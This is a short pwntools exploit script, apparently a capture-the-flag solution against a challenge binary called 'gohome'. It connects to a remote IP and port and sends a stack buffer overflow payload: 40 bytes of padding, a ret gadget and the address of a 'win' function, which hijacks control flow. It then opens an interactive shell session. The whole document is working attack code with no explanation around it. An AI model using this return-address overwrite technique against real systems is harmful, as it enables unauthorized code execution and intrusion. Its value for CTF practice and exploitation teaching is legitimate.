from pwn import *

ip = "140.110.112.77"
port = 6126

context.arch = "amd64"

r = remote(ip, port)
# r = process("./gohome")

ret = 0x400541
win = 0x4006c6

r.sendlineafter("?", flat("a" * 40, ret, win))

r.interactive()
